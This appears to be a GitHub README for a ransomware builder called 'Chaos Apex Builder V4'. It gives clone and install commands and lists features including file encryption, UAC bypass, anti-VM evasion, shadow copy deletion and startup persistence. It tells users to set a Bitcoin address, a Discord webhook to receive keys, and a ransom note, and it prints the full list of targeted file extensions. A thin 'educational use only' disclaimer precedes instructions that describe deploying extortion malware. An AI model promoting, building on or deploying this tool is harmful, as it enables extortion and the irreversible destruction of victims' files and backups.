🚀 Chaos Apex Builder V4

The ultimate open-source ransomware builder for educational purposes only. Generate customized encryptors and decryptors with advanced evasion techniques.

Step by Step install

git clone https://github.com/Voltex0000/Ransomware-py.git

cd Ransomware-py

Using venv to to install pip requirements.txt

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

python Ransomware.py
                  OR
python3 Ransomware.py

⚠️ DISCLAIMER

This tool is for EDUCATIONAL USE ONLY. The developers are not responsible for any damage caused by misuse. Use this to understand malware mechanics and improve your defenses.




✨ Features

    Advanced Encryption: AES-256 standard via cryptography library.
    Massive Target List: Encrypts over 200 file types including documents, media, databases, and backups.
    Custom Ransomware Note: Fully customizable popup window and text file messages.
    UAC Bypass: Includes Event Viewer UAC bypass logic (Windows 10/11).
    Anti-VM: Detects virtual environments (VMware, VirtualBox) to avoid analysis.
    Shadow Copy Deletion: Permanently destroys Windows System Restore points using vssadmin.
    Persistence: Adds payload to Windows Startup registry.
    Fake Update: Displays a "Working on updates" screen during encryption.
    One-Click Compilation: Built-in PyInstaller integration to generate .exe files instantly.



   Why Python Files Obfsucated ??

    Anyone Editing The tools And seling the tools but im publishing the tools for free


  📖 Usage 

    Configuration: Enter your Bitcoin address, Discord Webhook, and custom ransom note in the "Config & Note" tab. 
    Modules: Toggle features like Anti-VM, Shadow Copy Deletion, and UAC Bypass in the "Advanced Modules" tab. 
    Build: 
         Click "Save Encryptor" to get the raw Python script.
         Click "Build Encryptor EXE" to compile a standalone .exe file (located in the dist/ folder).
          
    Recovery: Use the generated Decryptor (input the key sent to your webhook) to restore files. 


TARGET_EXTENSIONS =

( ".txt", ".doc", ".docx", ".mp3", ".xls", ".xlsx", ".ppt", ".sql", ".wmv", ".mp4", ".dll", ".jar", 
    ".pptx", ".odt", ".jpg", ".tar", ".gz", ".bmp", ".pbm", ".rtf", ".png", ".csv", ".mdb", ".sln", 
    ".php", ".avi", ".mov", ".flv", ".amv", ".mpv", ".mtv", ".asp", ".aspx", ".html", ".xml", ".psd", 
    ".pdf", ".exe", ".rv", ".rvx", ".ved", ".wm", ".wma", ".midi", ".fla", ".ico", ".gif", ".GIF", 
    ".ogg", ".mpg", ".icns", ".RAR", ".zip", ".BAT", ".c", ".PNG", ".7z", ".sql", ".m4a", ".d3dbsp", 
    ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", 
    ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", 
    ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", 
    ".sb", ".fos", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", 
    ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", 
    ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
    ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", "rofl", ".hkx", ".bar", 
    ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", 
    ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".bigwallet", ".wotreplay", 
    ".xxx", ".desc", ".py", ".m3u", ".js", ".css", ".rb", ".jpeg", ".p7c", ".p7b", ".p12", 
    ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", "r3d", ".rw2", 
    ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrw", ".ref", ".mef", ".erf", ".kdc", ".dcr", 
    ".cr2", ".crw", ".cerber", ".WNCRY", ".dsewrbg", ".bay", ".sr2", ".srf", ".arw", ".3fr", 
    ".dng", ".jpe", ".cdr", ".indd", ".ai", ".eps", ".pdd", ".dbf", ".mdf", ".wb2", ".wpd", 
    ".dxg", ".xf", ".dwg", ".pst", ".vbs", ".accdb", ".pptm", ".xlsb", ".xlsm", ".wps", 
    ".docm", ".odb", ".odc", "odm", ".odp", ".ods", ".odt")
